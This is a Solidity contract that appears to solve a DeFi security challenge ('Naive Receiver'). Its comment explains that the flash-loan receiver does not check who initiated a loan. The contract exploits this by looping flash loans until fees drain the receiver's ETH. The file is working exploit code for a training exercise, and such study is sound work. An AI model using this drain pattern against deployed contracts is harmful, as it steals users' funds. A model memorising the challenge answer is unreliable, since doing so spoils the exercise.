// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

/**
 * SOLUTION:
 *
 * The borrower in this scenario neglects to check the initiator of the loan.
 * As a result, any account can initiate a loan. Exploiting this fact, an attacker
 * can repeatedly initiate loans forcing the receiver to pay the loan fee until it
 * has been completely drained.
 */

contract NaiveReceiverDrainer {
    address _owner;
    address _receiver;
    address _lender;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address receiver, address lender) {
        _owner = msg.sender;
        _receiver = receiver;
        _lender = lender;
    }

    function drain() external {
        require(msg.sender == _owner, "UNAUTHORIZED");
        while (_receiver.balance > 0) {
            _flashLoan();
        }
    }

    function _flashLoan() internal {
        IERC3156FlashLender(_lender).flashLoan(
            IERC3156FlashBorrower(_receiver),
            ETH,
            1, // amount doesn't really matter
            ""
        );
    }
}
